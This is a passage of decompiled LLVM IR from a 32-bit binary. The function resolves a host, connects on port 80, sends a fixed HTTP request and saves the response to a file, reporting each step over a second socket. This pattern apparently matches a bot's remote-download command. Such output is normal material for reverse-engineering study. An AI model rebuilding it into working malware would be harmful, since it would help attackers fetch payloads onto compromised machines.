  %v5_80489c5 = icmp ult i32 %v0_80489c5, 8
  store i1 %v5_80489c5, i1* %cf.global-to-local, align 1
  %v2_80489c9 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_80489c9, i32* @eax, align 4
  %v3_80489d0 = bitcast i32* %stack_var_-1096 to i8*
  %v4_80489d0 = call i32 @strcpy(i8* %v3_80489d0, i32 %v1_80489c2)
  br label %dec_label_pc_80489f5

dec_label_pc_80489da:                             ; preds = %dec_label_pc_8048970
  %v0_80489e2 = load i32, i32* @esp, align 4
  %v5_80489e2 = icmp ult i32 %v0_80489e2, 8
  store i1 %v5_80489e2, i1* %cf.global-to-local, align 1
  %v2_80489e6 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_80489e6, i32* @eax, align 4
  %v3_80489ed = bitcast i32* %stack_var_-1096 to i8*
  %v4_80489ed = call i32 @strcpy(i8* %v3_80489ed, i32 %v2_80489e0)
  br label %dec_label_pc_80489f5

dec_label_pc_80489f5:                             ; preds = %dec_label_pc_80489ba, %dec_label_pc_80489da
  %v4_8048a18.pre-phi = phi i8* [ %v3_80489d0, %dec_label_pc_80489ba ], [ %v3_80489ed, %dec_label_pc_80489da ]
  %v2_8048a04.pre-phi = phi i32 [ %v2_80489c9, %dec_label_pc_80489ba ], [ %v2_80489e6, %dec_label_pc_80489da ]
  %storemerge16.in = load i32, i32* @esp, align 4
  %storemerge16 = icmp ugt i32 %storemerge16.in, -17
  store i1 %storemerge16, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048a01

dec_label_pc_80489fe:                             ; preds = %dec_label_pc_8048a29
  %v4_80489fe = add i32 %storemerge8, 1
  br label %dec_label_pc_8048a01

dec_label_pc_8048a01:                             ; preds = %dec_label_pc_80489f5, %dec_label_pc_80489fe
  %storemerge8 = phi i32 [ %v4_80489fe, %dec_label_pc_80489fe ], [ 0, %dec_label_pc_80489f5 ]
  store i32 %storemerge8, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_8048a04.pre-phi, i32* @edi, align 4
  %v3_8048a1e = call i32 @_strlen(i8* %v4_8048a18.pre-phi)
  %v0_8048a25 = load i32, i32* @edx, align 4
  %v7_8048a25 = icmp ult i32 %v0_8048a25, %v3_8048a1e
  store i1 %v7_8048a25, i1* %cf.global-to-local, align 1
  %v1_8048a27 = icmp eq i1 %v7_8048a25, false
  br i1 %v1_8048a27, label %dec_label_pc_8048a01.dec_label_pc_8048a37_crit_edge, label %dec_label_pc_8048a29

dec_label_pc_8048a01.dec_label_pc_8048a37_crit_edge: ; preds = %dec_label_pc_8048a01
  %v0_8048a3a.pre = load i32, i32* @ebp, align 4
  %.pre = add i32 %storemerge8, -1092
  br label %dec_label_pc_8048a37

dec_label_pc_8048a29:                             ; preds = %dec_label_pc_8048a01
  %v0_8048a2c = load i32, i32* @ebp, align 4
  %v2_8048a2c = add i32 %storemerge8, -1092
  %v3_8048a2c = add i32 %v0_8048a2c, %v2_8048a2c
  %v4_8048a2c = inttoptr i32 %v3_8048a2c to i8*
  %v5_8048a2c = load i8, i8* %v4_8048a2c, align 1
  %v6_8048a33 = icmp ult i8 %v5_8048a2c, 47
  store i1 %v6_8048a33, i1* %cf.global-to-local, align 1
  %v10_8048a33 = icmp eq i8 %v5_8048a2c, 47
  %v1_8048a35 = icmp eq i1 %v10_8048a33, false
  br i1 %v1_8048a35, label %dec_label_pc_80489fe, label %dec_label_pc_8048a37

dec_label_pc_8048a37:                             ; preds = %dec_label_pc_8048a29, %dec_label_pc_8048a01.dec_label_pc_8048a37_crit_edge
  %v2_8048a3a.pre-phi = phi i32 [ %.pre, %dec_label_pc_8048a01.dec_label_pc_8048a37_crit_edge ], [ %v2_8048a2c, %dec_label_pc_8048a29 ]
  %v0_8048a3a = phi i32 [ %v0_8048a3a.pre, %dec_label_pc_8048a01.dec_label_pc_8048a37_crit_edge ], [ %v0_8048a2c, %dec_label_pc_8048a29 ]
  %v3_8048a3a = add i32 %v0_8048a3a, %v2_8048a3a.pre-phi
  %v4_8048a3a = inttoptr i32 %v3_8048a3a to i8*
  store i8 0, i8* %v4_8048a3a, align 1
  store i32 2, i32* %stack_var_-72, align 4
  %v0_8048a48 = load i32, i32* @esp, align 4
  %v5_8048a48 = icmp ult i32 %v0_8048a48, 12
  store i1 %v5_8048a48, i1* %cf.global-to-local, align 1
  %v1_8048a4d = call i32 @htons(i32 80)
  %v5_8048a59 = icmp ult i32* %stack_var_-5244, inttoptr (i32 12 to i32*)
  store i1 %v5_8048a59, i1* %cf.global-to-local, align 1
  %v1_8048a63 = call i32 @inet_addr(i32 %v2_8048a04.pre-phi)
  %v8_8048a6e = icmp ne i32 %v1_8048a63, -1
  store i1 %v8_8048a6e, i1* %cf.global-to-local, align 1
  %v13_8048a6e = icmp eq i32 %v1_8048a63, -1
  %v1_8048a72 = icmp eq i1 %v13_8048a6e, false
  br i1 %v1_8048a72, label %dec_label_pc_8048ace, label %dec_label_pc_8048a74

dec_label_pc_8048a74:                             ; preds = %dec_label_pc_8048a37
  store i1 %v5_8048a59, i1* %cf.global-to-local, align 1
  %v1_8048a7e = call i32 @__GI_gethostbyname(i32 %v2_8048a04.pre-phi)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8048a89 = icmp eq i32 %v1_8048a7e, 0
  %v1_8048a8d = icmp eq i1 %v4_8048a89, false
  br i1 %v1_8048a8d, label %dec_label_pc_8048aaf, label %dec_label_pc_8048a8f

dec_label_pc_8048a8f:                             ; preds = %dec_label_pc_8048a74
  %v5_8048a8f = icmp ult i32* %stack_var_-5244, inttoptr (i32 4 to i32*)
  store i1 %v5_8048a8f, i1* %cf.global-to-local, align 1
  %v3_8048a9d = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8068918.41 to i32))
  store i1 %v5_8048a59, i1* %cf.global-to-local, align 1
  %v1_8048aaa = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048aaf

dec_label_pc_8048aaf:                             ; preds = %dec_label_pc_8048a74, %dec_label_pc_8048a8f
  %v1_8048ab2 = add i32 %v1_8048a7e, 12
  %v2_8048ab2 = inttoptr i32 %v1_8048ab2 to i32*
  %v3_8048ab2 = load i32, i32* %v2_8048ab2, align 4
  %v1_8048aba = add i32 %v1_8048a7e, 16
  %v2_8048aba = inttoptr i32 %v1_8048aba to i32*
  %v3_8048aba = load i32, i32* %v2_8048aba, align 4
  %v1_8048abd = inttoptr i32 %v3_8048aba to i32*
  %v2_8048abd = load i32, i32* %v1_8048abd, align 4
  store i32 %v2_8048abd, i32* %edx.global-to-local, align 4
  %v5_8048ac2 = icmp eq i32* %stack_var_-72, inttoptr (i32 -4 to i32*)
  store i1 %v5_8048ac2, i1* %cf.global-to-local, align 1
  %v15_8048ac2 = ptrtoint i32* %stack_var_-68 to i32
  %tmp88 = bitcast i32* %stack_var_-68 to i8*
  store i32 %v15_8048ac2, i32* @edi, align 4
  %v1_8048ac7 = inttoptr i32 %v2_8048abd to i8*
  store i32 %v2_8048abd, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_8048aca = call i8* @_memcpy(i8* %tmp88, i8* %v1_8048ac7, i32 %v3_8048ab2)
  %v8_8048aca = ptrtoint i8* %v7_8048aca to i32
  store i32 %v8_8048aca, i32* @ecx, align 4
  %v0_8048aea.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048ad4

dec_label_pc_8048ace:                             ; preds = %dec_label_pc_8048a37
  store i32 %v1_8048a63, i32* %stack_var_-68, align 4
  br label %dec_label_pc_8048ad4

dec_label_pc_8048ad4:                             ; preds = %dec_label_pc_8048aaf, %dec_label_pc_8048ace
  %v0_8048aea = phi i32 [ %v0_8048aea.pre, %dec_label_pc_8048aaf ], [ %v7_80488fd, %dec_label_pc_8048ace ]
  %v2_8048ad4.pre-phi = ptrtoint i32* %stack_var_-72 to i32
  %v5_8048aea = icmp ult i32 %v0_8048aea, 4
  store i1 %v5_8048aea, i1* %cf.global-to-local, align 1
  %v4_8048af3 = call i32 @connect(i32 %v4_804893f, i32 %v2_8048ad4.pre-phi, i32 16)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048afb = icmp eq i32 %v4_8048af3, 0
  br i1 %v1_8048afb, label %dec_label_pc_8048ad4.dec_label_pc_8048b1f_crit_edge, label %dec_label_pc_8048aff

dec_label_pc_8048ad4.dec_label_pc_8048b1f_crit_edge: ; preds = %dec_label_pc_8048ad4
  br label %dec_label_pc_8048b1f

dec_label_pc_8048aff:                             ; preds = %dec_label_pc_8048ad4
  %v5_8048aff = icmp ult i32* %stack_var_-5244, inttoptr (i32 4 to i32*)
  store i1 %v5_8048aff, i1* %cf.global-to-local, align 1
  %v3_8048b0d = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8068940.42 to i32))
  store i1 %v5_8048a59, i1* %cf.global-to-local, align 1
  %v1_8048b1a = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048b1f

dec_label_pc_8048b1f:                             ; preds = %dec_label_pc_8048ad4.dec_label_pc_8048b1f_crit_edge, %dec_label_pc_8048aff
  %v2_8048b2a = add i32 %storemerge8, %v2_8048a04.pre-phi
  %v7_8048b2a = icmp ult i32 %v2_8048b2a, %v2_8048a04.pre-phi
  store i1 %v7_8048b2a, i1* %cf.global-to-local, align 1
  %v1_8048b2c = add i32 %v2_8048b2a, 1
  store i32 %v1_8048b2c, i32* %edx.global-to-local, align 4
  %v3_8048b3f = call i32 @Send(i32 %v4_804893f, i32 ptrtoint ([276 x i8]* @global_var_8068968.43 to i32))
  %v5_8048b47 = icmp ult i32* %stack_var_-5244, inttoptr (i32 4 to i32*)
  store i1 %v5_8048b47, i1* %cf.global-to-local, align 1
  %v3_8048b55 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_8068a7c.44 to i32))
  %v1_8048b60 = add i32 %arg4, 8
  %v5_8048b60 = icmp ugt i32 %arg4, -9
  %v1_8048b63 = inttoptr i32 %v1_8048b60 to i32*
  %v2_8048b63 = load i32, i32* %v1_8048b63, align 4
  store i32 %v2_8048b63, i32* @eax, align 4
  %v5_8048b65 = icmp ult i32* %stack_var_-5244, inttoptr (i32 8 to i32*)
  store i1 %v5_8048b65, i1* %cf.global-to-local, align 1
  %v3_8048b6e = call i32 @__GI_fopen(i32 %v2_8048b63, i32 ptrtoint ([3 x i8]* @global_var_8068a98.45 to i32))
  %v0_8048b73 = load i32, i32* @esp, align 4
  %v2_8048b73 = icmp ugt i32 %v0_8048b73, -17
  store i1 %v2_8048b73, i1* %cf.global-to-local, align 1
  %v2_8048b80 = ptrtoint i32* %stack_var_-5192 to i32
  %v5_8048b8a126 = call i32 @recv(i32 %v4_804893f, i32 %v2_8048b80, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp89128 = icmp slt i32 %v5_8048b8a126, 1
  br i1 %tmp89128, label %dec_label_pc_8048cb6.loopexit17, label %dec_label_pc_8048b9f

dec_label_pc_8048b79.loopexit:                    ; preds = %dec_label_pc_8048ca2
  %v5_8048b8a = call i32 @recv(i32 %v4_804893f, i32 %v2_8048b80, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp89 = icmp slt i32 %v5_8048b8a, 1
  br i1 %tmp89, label %dec_label_pc_8048cb6.loopexit17, label %dec_label_pc_8048b9f

dec_label_pc_8048b9f:                             ; preds = %dec_label_pc_8048b1f, %dec_label_pc_8048b79.loopexit
  %v5_8048b8a129 = phi i32 [ %v5_8048b8a, %dec_label_pc_8048b79.loopexit ], [ %v5_8048b8a126, %dec_label_pc_8048b1f ]
  %v4_8048b9f = add i32 %v5_8048b8a129, -4095
  %v8_8048b9f = icmp ult i32 %v5_8048b8a129, 4095
  %v9_8048b9f = sub i32 4094, %v5_8048b8a129
  %v10_8048b9f = and i32 %v9_8048b9f, %v5_8048b8a129
  %v11_8048b9f = icmp slt i32 %v10_8048b9f, 0
  store i1 %v8_8048b9f, i1* %cf.global-to-local, align 1
  %v12_8048b9f = icmp eq i32 %v4_8048b9f, 0
  %v13_8048b9f = icmp slt i32 %v4_8048b9f, 0
  %v3_8048ba6 = icmp eq i1 %v13_8048b9f, %v11_8048b9f
  %v4_8048ba6 = icmp eq i1 %v12_8048b9f, false
  %v5_8048ba6 = and i1 %v4_8048ba6, %v3_8048ba6
  br i1 %v5_8048ba6, label %dec_label_pc_8048bbf.lr.ph, label %dec_label_pc_8048ba8

dec_label_pc_8048ba8:                             ; preds = %dec_label_pc_8048b9f
  %v0_8048bab = load i32, i32* @ebp, align 4
  %v2_8048bab = add i32 %v5_8048b8a129, -5188
  %v3_8048bab = add i32 %v2_8048bab, %v0_8048bab
  %v4_8048bab = inttoptr i32 %v3_8048bab to i8*
  store i8 0, i8* %v4_8048bab, align 1
  br label %dec_label_pc_8048bbf.lr.ph

dec_label_pc_8048bbf.lr.ph:                       ; preds = %dec_label_pc_8048ba8, %dec_label_pc_8048b9f
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048bbf

dec_label_pc_8048bbf:                             ; preds = %dec_label_pc_8048bbf.lr.ph, %dec_label_pc_8048ca2
  %storemerge7125 = phi i32 [ 0, %dec_label_pc_8048bbf.lr.ph ], [ %v4_8048ca2, %dec_label_pc_8048ca2 ]
  store i32 %storemerge7125, i32* %edx.global-to-local, align 4
  %v2_8048bca = add i32 %storemerge7125, %v2_8048b80
  %v7_8048bca = icmp ult i32 %v2_8048bca, %v2_8048b80
  store i1 %v7_8048bca, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_8048be7 = inttoptr i32 %v2_8048bca to i8*
  store i32 %v2_8048bca, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8068a9b.46 to i32), i32* @edi, align 4
  %v7_8048bf9 = call i32 @_strncmp(i8* %v4_8048be7, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068a9b.46, i32 0, i32 0), i32 4)
  %v8_8048bf9 = urem i32 %v7_8048bf9, 2
  %v9_8048bf9 = icmp eq i32 %v8_8048bf9, 0
  %v0_8048bfb = load i1, i1* %cf.global-to-local, align 1
  %v2_8048bfb = or i1 %v0_8048bfb, %v9_8048bf9
  %v3_8048bfb = zext i1 %v2_8048bfb to i32
  %v4_8048bfb = load i32, i32* %edx.global-to-local, align 4
  %v5_8048bfb = and i32 %v4_8048bfb, -256
  %v6_8048bfb = or i32 %v3_8048bfb, %v5_8048bfb
  %v7_8048bfb = xor i32 %v6_8048bfb, 1
  store i32 %v7_8048bfb, i32* @edx, align 4
  %v3_8048c01 = and i32 %v7_8048bf9, -256
  %v1_8048c03 = trunc i32 %v7_8048bfb to i8
  %v3_8048c03 = zext i1 %v0_8048bfb to i8
  %v4_8048c03 = sub nsw i8 %v1_8048c03, %v3_8048c03
  %v15_8048c03 = icmp eq i8 %v4_8048c03, 0
  %v20_8048c03 = zext i8 %v4_8048c03 to i32
  %v23_8048c03 = or i32 %v20_8048c03, %v3_8048c01
  store i32 %v23_8048c03, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048c0c = icmp eq i1 %v15_8048c03, false
  br i1 %v1_8048c0c, label %dec_label_pc_8048ca2, label %dec_label_pc_8048c12

dec_label_pc_8048c12:                             ; preds = %dec_label_pc_8048bbf
  %v4_8048c12 = add i32 %storemerge7125, 4
  %v1_8048c21 = add i32 %v3_8048b6e, 52
  %v2_8048c21 = inttoptr i32 %v1_8048c21 to i32*
  %v1_8048c2b = add i32 %v3_8048b6e, 16
  %v2_8048c2b = inttoptr i32 %v1_8048c2b to i32*
  %v1_8048c31 = add i32 %v3_8048b6e, 28
  %v2_8048c31 = inttoptr i32 %v1_8048c31 to i32*
  %v10_8048c97109 = icmp ult i32 %v4_8048c12, %v5_8048b8a129
  store i1 %v10_8048c97109, i1* %cf.global-to-local, align 1
  %v5_8048c9a115 = icmp slt i32 %v4_8048c12, %v5_8048b8a129
  br i1 %v5_8048c9a115, label %dec_label_pc_8048c18, label %dec_label_pc_8048cb6

dec_label_pc_8048c18:                             ; preds = %dec_label_pc_8048c12, %dec_label_pc_8048c91
  %storemerge13.in116 = phi i32 [ %v4_8048c91, %dec_label_pc_8048c91 ], [ %v4_8048c12, %dec_label_pc_8048c12 ]
  %v3_8048c21 = load i32, i32* %v2_8048c21, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048c24 = icmp eq i32 %v3_8048c21, 0
  br i1 %v1_8048c24, label %dec_label_pc_8048c73, label %dec_label_pc_8048c28

dec_label_pc_8048c28:                             ; preds = %dec_label_pc_8048c18
  %v3_8048c2b = load i32, i32* %v2_8048c2b, align 4
  store i32 %v3_8048c2b, i32* @edx, align 4
  %v3_8048c31 = load i32, i32* %v2_8048c31, align 4
  %v7_8048c34 = icmp ult i32 %v3_8048c2b, %v3_8048c31
  store i1 %v7_8048c34, i1* %cf.global-to-local, align 1
  %v1_8048c36 = icmp eq i1 %v7_8048c34, false
  br i1 %v1_8048c36, label %dec_label_pc_8048c53, label %dec_label_pc_8048c38

dec_label_pc_8048c38:                             ; preds = %dec_label_pc_8048c28
  %v3_8048c3b = load i32, i32* %v2_8048c2b, align 4
  store i32 %v3_8048c3b, i32* %edx.global-to-local, align 4
  %v0_8048c41 = load i32, i32* @ebp, align 4
  %v2_8048c41 = add i32 %storemerge13.in116, -5188
  %v3_8048c41 = add i32 %v2_8048c41, %v0_8048c41
  %v4_8048c41 = inttoptr i32 %v3_8048c41 to i8*
  %v5_8048c41 = load i8, i8* %v4_8048c41, align 1
  %v3_8048c48 = inttoptr i32 %v3_8048c3b to i8*
  store i8 %v5_8048c41, i8* %v3_8048c48, align 1
  %v0_8048c4a = load i32, i32* %edx.global-to-local, align 4
  %v1_8048c4a = add i32 %v0_8048c4a, 1
  store i32 %v1_8048c4a, i32* @edx, align 4
  store i32 %v1_8048c4a, i32* %v2_8048c2b, align 4
  br label %dec_label_pc_8048c91

dec_label_pc_8048c53:                             ; preds = %dec_label_pc_8048c28
  %v0_8048c56 = load i32, i32* @ebp, align 4
  %v2_8048c56 = add i32 %storemerge13.in116, -5188
  %v3_8048c56 = add i32 %v2_8048c56, %v0_8048c56
  %v4_8048c56 = inttoptr i32 %v3_8048c56 to i8*
  %v5_8048c56 = load i8, i8* %v4_8048c56, align 1
  %v0_8048c62 = load i32, i32* @esp, align 4
  %v5_8048c62 = icmp ult i32 %v0_8048c62, 8
  store i1 %v5_8048c62, i1* %cf.global-to-local, align 1
  %v4_8048c69 = call i32 @putc_unlocked(i8 %v5_8048c56, i32 %v3_8048b6e)
  %v0_8048c6e = load i32, i32* @esp, align 4
  %v2_8048c6e = icmp ugt i32 %v0_8048c6e, -17
  store i1 %v2_8048c6e, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048c91

dec_label_pc_8048c73:                             ; preds = %dec_label_pc_8048c18
  %v0_8048c76 = load i32, i32* @ebp, align 4
  %v2_8048c76 = add i32 %storemerge13.in116, -5188
  %v3_8048c76 = add i32 %v2_8048c76, %v0_8048c76
  %v4_8048c76 = inttoptr i32 %v3_8048c76 to i8*
  %v5_8048c76 = load i8, i8* %v4_8048c76, align 1
  %v0_8048c82 = load i32, i32* @esp, align 4
  %v5_8048c82 = icmp ult i32 %v0_8048c82, 8
  store i1 %v5_8048c82, i1* %cf.global-to-local, align 1
  %v4_8048c89 = call i32 @__GI_fputc(i8 %v5_8048c76, i32 %v3_8048b6e)
  %v0_8048c8e = load i32, i32* @esp, align 4
  %v2_8048c8e = icmp ugt i32 %v0_8048c8e, -17
  store i1 %v2_8048c8e, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048c91

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_8048c53, %dec_label_pc_8048c38, %dec_label_pc_8048c73
  %v4_8048c91 = add i32 %storemerge13.in116, 1
  %v10_8048c97 = icmp ult i32 %v4_8048c91, %v5_8048b8a129
  store i1 %v10_8048c97, i1* %cf.global-to-local, align 1
  %exitcond134 = icmp eq i32 %v4_8048c91, %v5_8048b8a129
  br i1 %exitcond134, label %dec_label_pc_8048cb6, label %dec_label_pc_8048c18

dec_label_pc_8048ca2:                             ; preds = %dec_label_pc_8048bbf
  %v4_8048ca2 = add nuw nsw i32 %storemerge7125, 1
  %v10_8048ca8 = icmp ult i32 %v4_8048ca2, %v5_8048b8a129
  store i1 %v10_8048ca8, i1* %cf.global-to-local, align 1
  %v5_8048cab = icmp slt i32 %v4_8048ca2, %v5_8048b8a129
  br i1 %v5_8048cab, label %dec_label_pc_8048bbf, label %dec_label_pc_8048b79.loopexit

dec_label_pc_8048cb6.loopexit17:                  ; preds = %dec_label_pc_8048b79.loopexit, %dec_label_pc_8048b1f
  %.pre31 = add i32 %v3_8048b6e, 52
  %.pre32 = inttoptr i32 %.pre31 to i32*
  %.pre34 = add i32 %v3_8048b6e, 16
  %.pre35 = inttoptr i32 %.pre34 to i32*
  %.pre36 = add i32 %v3_8048b6e, 28
  %.pre37 = inttoptr i32 %.pre36 to i32*
  br label %dec_label_pc_8048cb6

dec_label_pc_8048cb6:                             ; preds = %dec_label_pc_8048c12, %dec_label_pc_8048c91, %dec_label_pc_8048cb6.loopexit17
  %v2_8048d2e.pre-phi = phi i32* [ %.pre37, %dec_label_pc_8048cb6.loopexit17 ], [ %v2_8048c31, %dec_label_pc_8048c91 ], [ %v2_8048c31, %dec_label_pc_8048c12 ]
  %v2_8048d28.pre-phi = phi i32* [ %.pre35, %dec_label_pc_8048cb6.loopexit17 ], [ %v2_8048c2b, %dec_label_pc_8048c91 ], [ %v2_8048c2b, %dec_label_pc_8048c12 ]
  %v2_8048d1e.pre-phi = phi i32* [ %.pre32, %dec_label_pc_8048cb6.loopexit17 ], [ %v2_8048c21, %dec_label_pc_8048c91 ], [ %v2_8048c21, %dec_label_pc_8048c12 ]
  store i1 %v5_8048b60, i1* %cf.global-to-local, align 1
  %v3_8048cca = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_8068aa0.47 to i32))
  %v0_8048ccf = load i32, i32* @esp, align 4
  %v2_8048ccf = icmp ugt i32 %v0_8048ccf, -17
  store i1 %v2_8048ccf, i1* %cf.global-to-local, align 1
  %v5_8048ce3104 = call i32 @recv(i32 %v4_804893f, i32 %v2_8048b80, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp90106 = icmp slt i32 %v5_8048ce3104, 1
  br i1 %tmp90106, label %dec_label_pc_8048da2, label %dec_label_pc_8048cf8

dec_label_pc_8048cd2.loopexit:                    ; preds = %dec_label_pc_8048d8e
  %v5_8048ce3 = call i32 @recv(i32 %v4_804893f, i32 %v2_8048b80, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp90 = icmp slt i32 %v5_8048ce3, 1
  br i1 %tmp90, label %dec_label_pc_8048da2, label %dec_label_pc_8048cf8

dec_label_pc_8048cf8:                             ; preds = %dec_label_pc_8048cb6, %dec_label_pc_8048cd2.loopexit
  %v5_8048ce3107 = phi i32 [ %v5_8048ce3, %dec_label_pc_8048cd2.loopexit ], [ %v5_8048ce3104, %dec_label_pc_8048cb6 ]
  %v4_8048cf8 = add i32 %v5_8048ce3107, -4095
  %v8_8048cf8 = icmp ult i32 %v5_8048ce3107, 4095
  %v9_8048cf8 = sub i32 4094, %v5_8048ce3107
  %v10_8048cf8 = and i32 %v9_8048cf8, %v5_8048ce3107
  %v11_8048cf8 = icmp slt i32 %v10_8048cf8, 0
  store i1 %v8_8048cf8, i1* %cf.global-to-local, align 1
  %v12_8048cf8 = icmp eq i32 %v4_8048cf8, 0
  %v13_8048cf8 = icmp slt i32 %v4_8048cf8, 0
  %v3_8048cff = icmp eq i1 %v13_8048cf8, %v11_8048cf8
  %v4_8048cff = icmp eq i1 %v12_8048cf8, false
  %v5_8048cff = and i1 %v4_8048cff, %v3_8048cff
  br i1 %v5_8048cff, label %dec_label_pc_8048d15.lr.ph, label %dec_label_pc_8048d01

dec_label_pc_8048d01:                             ; preds = %dec_label_pc_8048cf8
  %v0_8048d04 = load i32, i32* @ebp, align 4
  %v2_8048d04 = add i32 %v5_8048ce3107, -5188
  %v3_8048d04 = add i32 %v2_8048d04, %v0_8048d04
  %v4_8048d04 = inttoptr i32 %v3_8048d04 to i8*
  store i8 0, i8* %v4_8048d04, align 1
  br label %dec_label_pc_8048d15.lr.ph

dec_label_pc_8048d15.lr.ph:                       ; preds = %dec_label_pc_8048d01, %dec_label_pc_8048cf8
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048d15

dec_label_pc_8048d15:                             ; preds = %dec_label_pc_8048d8e, %dec_label_pc_8048d15.lr.ph
  %storemerge5103 = phi i32 [ 0, %dec_label_pc_8048d15.lr.ph ], [ %v4_8048d8e, %dec_label_pc_8048d8e ]
  %v3_8048d1e = load i32, i32* %v2_8048d1e.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048d21 = icmp eq i32 %v3_8048d1e, 0
  br i1 %v1_8048d21, label %dec_label_pc_8048d70, label %dec_label_pc_8048d25

dec_label_pc_8048d25:                             ; preds = %dec_label_pc_8048d15
  %v3_8048d28 = load i32, i32* %v2_8048d28.pre-phi, align 4
  store i32 %v3_8048d28, i32* @edx, align 4
  %v3_8048d2e = load i32, i32* %v2_8048d2e.pre-phi, align 4
  %v7_8048d31 = icmp ult i32 %v3_8048d28, %v3_8048d2e
  store i1 %v7_8048d31, i1* %cf.global-to-local, align 1
  %v1_8048d33 = icmp eq i1 %v7_8048d31, false
  br i1 %v1_8048d33, label %dec_label_pc_8048d50, label %dec_label_pc_8048d35

dec_label_pc_8048d35:                             ; preds = %dec_label_pc_8048d25
  %v3_8048d38 = load i32, i32* %v2_8048d28.pre-phi, align 4
  store i32 %v3_8048d38, i32* %edx.global-to-local, align 4
  %v0_8048d3e = load i32, i32* @ebp, align 4
  %v2_8048d3e = add nsw i32 %storemerge5103, -5188
  %v3_8048d3e = add i32 %v2_8048d3e, %v0_8048d3e
  %v4_8048d3e = inttoptr i32 %v3_8048d3e to i8*
  %v5_8048d3e = load i8, i8* %v4_8048d3e, align 1
  %v3_8048d45 = inttoptr i32 %v3_8048d38 to i8*
  store i8 %v5_8048d3e, i8* %v3_8048d45, align 1
  %v0_8048d47 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048d47 = add i32 %v0_8048d47, 1
  store i32 %v1_8048d47, i32* @edx, align 4
  store i32 %v1_8048d47, i32* %v2_8048d28.pre-phi, align 4
  br label %dec_label_pc_8048d8e

dec_label_pc_8048d50:                             ; preds = %dec_label_pc_8048d25
  %v0_8048d53 = load i32, i32* @ebp, align 4
  %v2_8048d53 = add nsw i32 %storemerge5103, -5188
  %v3_8048d53 = add i32 %v2_8048d53, %v0_8048d53
  %v4_8048d53 = inttoptr i32 %v3_8048d53 to i8*
  %v5_8048d53 = load i8, i8* %v4_8048d53, align 1
  %v0_8048d5f = load i32, i32* @esp, align 4
  %v5_8048d5f = icmp ult i32 %v0_8048d5f, 8
  store i1 %v5_8048d5f, i1* %cf.global-to-local, align 1
  %v4_8048d66 = call i32 @putc_unlocked(i8 %v5_8048d53, i32 %v3_8048b6e)
  %v0_8048d6b = load i32, i32* @esp, align 4
  %v2_8048d6b = icmp ugt i32 %v0_8048d6b, -17
  store i1 %v2_8048d6b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048d8e

dec_label_pc_8048d70:                             ; preds = %dec_label_pc_8048d15
  %v0_8048d73 = load i32, i32* @ebp, align 4
  %v2_8048d73 = add nsw i32 %storemerge5103, -5188
  %v3_8048d73 = add i32 %v2_8048d73, %v0_8048d73
  %v4_8048d73 = inttoptr i32 %v3_8048d73 to i8*
  %v5_8048d73 = load i8, i8* %v4_8048d73, align 1
  %v0_8048d7f = load i32, i32* @esp, align 4
  %v5_8048d7f = icmp ult i32 %v0_8048d7f, 8
  store i1 %v5_8048d7f, i1* %cf.global-to-local, align 1
  %v4_8048d86 = call i32 @__GI_fputc(i8 %v5_8048d73, i32 %v3_8048b6e)
  %v0_8048d8b = load i32, i32* @esp, align 4
  %v2_8048d8b = icmp ugt i32 %v0_8048d8b, -17
  store i1 %v2_8048d8b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048d8e

dec_label_pc_8048d8e:                             ; preds = %dec_label_pc_8048d50, %dec_label_pc_8048d35, %dec_label_pc_8048d70
  %v4_8048d8e = add nuw nsw i32 %storemerge5103, 1
  %v10_8048d94 = icmp ult i32 %v4_8048d8e, %v5_8048ce3107
  store i1 %v10_8048d94, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_8048d8e, %v5_8048ce3107
  br i1 %exitcond, label %dec_label_pc_8048cd2.loopexit, label %dec_label_pc_8048d15

dec_label_pc_8048da2:                             ; preds = %dec_label_pc_8048cd2.loopexit, %dec_label_pc_8048cb6
  store i1 %v5_8048a59, i1* %cf.global-to-local, align 1
  %v1_8048da8 = inttoptr i32 %v3_8048b6e to i16*
  %v2_8048da8 = call i32 @__GI_fclose(i16* %v1_8048da8)
  store i1 %v5_8048a59, i1* %cf.global-to-local, align 1
  %v1_8048db6 = call i32 @close(i32 %v4_804893f)
  store i1 %v5_8048a59, i1* %cf.global-to-local, align 1
  %v1_8048dc3 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048dc8

dec_label_pc_8048dc8:                             ; preds = %entry, %dec_label_pc_8048da2
  %v0_8048dce = phi i32 [ %v1_8048900, %entry ], [ %v1_8048dc3, %dec_label_pc_8048da2 ]
  ret i32 %v0_8048dce

; uselistorder directives
